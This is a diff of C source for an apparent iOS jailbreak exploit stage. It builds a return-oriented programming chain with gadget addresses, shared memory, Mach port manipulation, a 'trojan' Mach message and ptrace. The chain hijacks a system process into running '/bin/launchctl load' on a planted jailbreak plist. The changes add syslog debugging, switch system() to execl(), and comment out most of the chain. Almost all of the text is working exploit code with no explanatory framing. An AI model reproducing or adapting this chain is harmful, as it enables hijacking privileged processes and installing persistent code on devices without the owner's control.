@@ -454,7 +454,7 @@ int ropMain(int slide) {
 	ropStackPivotLo(ROP2_ABS_ADDR);
 
 	ropLog("Entering racoon ROP.\n");
-
+/*
         Addr aShmBaseAddress = newInteger(0);
         ropCall3(dscs + _dsc_shm_open, newString("apple.shm.notification_center"), O_RDWR | O_CREAT, 0644);
         ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x24); // shm fd to PLACE_HOLDER
@@ -623,7 +623,10 @@ int ropMain(int slide) {
         ropDerefReg0();
         ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // bootstrap_port to PLACE_HOLDER
         ropCall3(dscs + _dsc_bootstrap_look_up, PLACE_HOLDER, newString("com.apple.system.notification_center"), aPort);
-        ropLog("Looked up notification center\n");
+
+        ropLoadReg0(aPort);
+	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
+	ropCall3(dscs + _dsc_syslog, LOG_WARNING, newString("Looked up notification center: %p\n"), PLACE_HOLDER);
 
 	// ropPtrace(PT_ATTACH, aPid, 0, 0);
 	ropLoadReg0(aPid);
@@ -664,6 +667,10 @@ int ropMain(int slide) {
         ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // localPort to third PLACE_HOLDER
         ropCall4(dscs + _dsc_mach_port_insert_right, PLACE_HOLDER, PLACE_HOLDER, PLACE_HOLDER, MACH_MSG_TYPE_MAKE_SEND);
 
+        ropLoadReg0(aLocalPort);
+	ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x0c); // aPid to PLACE_HOLDER
+	ropCall3(dscs + _dsc_syslog, LOG_WARNING, newString("Local port: %p\n"), PLACE_HOLDER);
+
         struct trojan_msg msg;
 
         msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
@@ -696,35 +703,55 @@ int ropMain(int slide) {
 	ropLog("sleeping...");
 	ropCall1(dscs + _dsc_sleep, 1);
 
-        Addr aNotifydStringAddress = newInteger(0);
+        Addr aNotifydStringArg0Address = newInteger(0);
+        Addr aNotifydStringArg1Address = newInteger(0);
+        Addr aNotifydStringArg2Address = newInteger(0);
         ropLoadReg0(aShmAddress);
-        ropAddReg0Const(0x60);
-        ropSaveReg0(aNotifydStringAddress);
+        ropAddReg0Const(0x64);
+        ropSaveReg0(aNotifydStringArg0Address);
+        ropAddReg0Const(sizeof("/bin/launchctl"));
+        ropSaveReg0(aNotifydStringArg1Address);
+        ropAddReg0Const(sizeof("load"));
+        ropSaveReg0(aNotifydStringArg2Address);
 
-        Addr aNotifydFileStringAddress = newInteger(0);
-        ropAddReg0Const(sizeof("/bin/launchctl load ") - 1);
-        ropSaveReg0(aNotifydFileStringAddress);
-
-        Addr aRacoonStringAddress = newInteger(0);
+        Addr aRacoonStringArg0Address = newInteger(0);
+        Addr aRacoonStringArg1Address = newInteger(0);
+        Addr aRacoonStringArg2Address = newInteger(0);
         ropLoadReg0(aShmBaseAddress);
-        ropAddReg0Const(0x60);
-        ropSaveReg0(aRacoonStringAddress);
+        ropAddReg0Const(0x64);
+        ropSaveReg0(aRacoonStringArg0Address);
+        ropAddReg0Const(sizeof("/bin/launchctl"));
+        ropSaveReg0(aRacoonStringArg1Address);
+        ropAddReg0Const(sizeof("load"));
+        ropSaveReg0(aRacoonStringArg2Address);
 
         ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x0C, dscs + GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
         ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x1C, dscs + GADGET_MOV_LR_R4_MOV_R0_LR_POP47);
         ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x20, dscs + _dsc_exit);
         ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x28, dscs + LIBC_POP_R0123);
-        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x2C, aNotifydFileStringAddress);
+        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x2C, aNotifydStringArg2Address);
         ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x30, 0x0);
         ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x34, 0x0);
         ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x3C, dscs + _dsc_chown);
         ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x48, dscs + LIBC_POP_R0123);
-        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x4C, aNotifydStringAddress);
-        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x5C, dscs + _dsc_system);
+        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x4C, aNotifydStringArg0Address);
+        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x50, aNotifydStringArg0Address);
+        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x54, aNotifydStringArg1Address);
+        ropStoreVariableValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x58, aNotifydStringArg2Address);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x5C, dscs + _dsc_execl);
+        ropStoreValueAtOffsetFromVariableAddress(aShmBaseAddress, 0x60, 0x0);
 
-        ropLoadReg0(aRacoonStringAddress);
-        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringAddress to PLACE_HOLDER
-        ropCall2(dscs + _dsc_strcpy, PLACE_HOLDER, newString("/bin/launchctl load /private/var/mobile/Media/jb.plist"));
+        ropLoadReg0(aRacoonStringArg0Address);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringArg0Address to PLACE_HOLDER
+        ropCall2(dscs + _dsc_strcpy, PLACE_HOLDER, newString("/bin/launchctl"));
+
+        ropLoadReg0(aRacoonStringArg1Address);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringArg1Address to PLACE_HOLDER
+        ropCall2(dscs + _dsc_strcpy, PLACE_HOLDER, newString("load"));
+
+        ropLoadReg0(aRacoonStringArg2Address);
+        ropSaveReg0(ropWriteAddr + ROP_SAVE_REG0_LEN + 0x04); // racoonStringArg2Address to PLACE_HOLDER
+        ropCall2(dscs + _dsc_strcpy, PLACE_HOLDER, newString("/private/var/mobile/Media/corona/jb.plist"));
 
 	// ropPtrace(PT_CONTINUE, aPid, aAddr, 0);
 	ropLoadReg0(aPid);
@@ -741,9 +768,8 @@ int ropMain(int slide) {
 	// ropSleep(1);
 	ropLog("sleeping...");
 	ropCall1(dscs + _dsc_sleep, 1);
-
+*/
 	// -------------------------------------------------------------
-
 	ropLog("Racoon ROP ended.\n");
 	ropCall1(dscs + _dsc_exit, 0);
 
